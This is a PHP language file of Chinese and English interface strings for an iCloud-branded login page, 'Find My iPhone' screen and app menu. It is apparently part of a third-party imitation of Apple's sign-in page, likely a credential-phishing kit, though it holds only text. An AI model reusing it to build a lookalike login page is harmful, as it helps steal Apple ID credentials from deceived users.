<?php
/*
------------------
Language: Chinese/china
------------------
*/
 
$lang = array();
// Header 
$lang['PAGE_TITLE'] = 'iCloud';
$lang['SETUP_INSTRUCTIONS'] = '設置';
// login form
$lang['SIGN_IN_TITLE'] = '登錄iCloud';
$lang['INCORRECT_ID'] = '您的Apple ID或密碼不正確。';
$lang['APPLE_ID'] = 'Apple ID';
$lang['PASSWORD'] = '密碼';
$lang['KEEP_ME'] = '保持登錄狀態';
$lang['FORGOT_ID'] = '忘記您的Apple ID或密碼？';
$lang['DONT_HAVE_ID'] = '沒有Apple ID？';
$lang['CREATE_YOURS'] = '立即創建您的。';
// Footer
$lang['CHECK_ACTIVATION'] = '檢查激活鎖定狀態';
$lang['SYSTEM_STATUS'] = '系統狀態';
$lang['POLICY'] = '隱私政策';
$lang['TERMS'] = '條款和條件';
$lang['COPYRIGHT'] = 'Copyright © 2017 Apple Inc.保留所有權利。';
// mobile version language
$lang['MOB_PAGE_TITLE'] = 'iCloud';
$lang['MOB_FIND'] = '查找我的iPhone';
$lang['MOB_APPLE_ID'] = 'Apple ID';
$lang['MOB_EXAMPLE'] = 'example@icloud.com';
$lang['MOB_PASSWORD'] = '密碼';
$lang['MOB_REQUIRED'] = '需要';
$lang['MOB_LOGIN'] = '簽到...';
$lang['FAILEDLOGINMSG'] = 'Your Apple ID or password was incorrect.';
$lang['PLZENTERMAIL'] = 'Please enter your email';
$lang['PLZENTERPASS'] = 'Please enter your password';
$lang['MOB_FORGOT_ID'] = '忘記Apple ID或密碼？';
$lang['MOB_SETUP_INSTRUCTIONS'] = '安裝說明';
$lang['MOB_locating'] = '定位...';
$lang['IDPWD_ERROR_ALERT1'] = '驗證失敗';
$lang['IDPWD_ERROR_ALERT2'] = '您的Apple ID或密碼不正確。';
// Home Page
$lang['REMINDERS'] = '提醒';
$lang['NOTES'] = '筆記';
$lang['ICLOUD_DRIVE'] = 'iCloud Drive';
$lang['PHOTOS'] = '相片';
$lang['CONTACTS'] = '聯繫人';
$lang['MAIL'] = '郵件';
$lang['SETTINGS'] = '設置';
$lang['FIND_MY_IPHONE'] = '查找我的iPhone';
$lang['KEYNOTE'] = '基調';
$lang['NUMBERS'] = '數字';
$lang['FIND_FRIENDS'] = '找朋友';
$lang['PAGES'] = '頁面';
// Find . php
$lang['ALL_DEVICES'] = '所有設備';
$lang['ICLOUD_SETTINGS'] = 'iCloud設置';
$lang['SIGN_OUT'] = '退出';
$lang['LOCATE'] = '定位...';
$lang['ALL_DEVICES_OFFLINE'] = '所有設備離線';
$lang['NO_LOCO'] = '由於您的所有裝置都離線，因此無法顯示位置。';
?>